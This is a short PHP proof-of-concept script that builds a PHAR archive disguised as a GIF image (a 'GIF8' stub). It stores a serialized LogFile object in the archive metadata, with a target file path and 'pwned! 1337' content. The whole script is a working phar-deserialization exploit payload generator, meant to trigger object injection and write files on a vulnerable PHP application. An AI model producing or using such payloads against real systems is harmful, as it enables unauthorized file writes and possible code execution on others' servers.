<?php

class LogFile {
    public function __construct() {
        $this->filename = '/Users/ironsoul/Desktop/test.txt';
        $this->fcontents = 'pwned! 1337';
    }
}

$phar = new \Phar("test.phar");
$phar->startBuffering();
$phar->setStub("GIF8;<?php __HALT_COMPILER(); ?>");

$payload = new LogFile();
$phar->setMetadata($payload);

$phar->addFromString("test.txt", "test");
$phar->stopBuffering();

?>
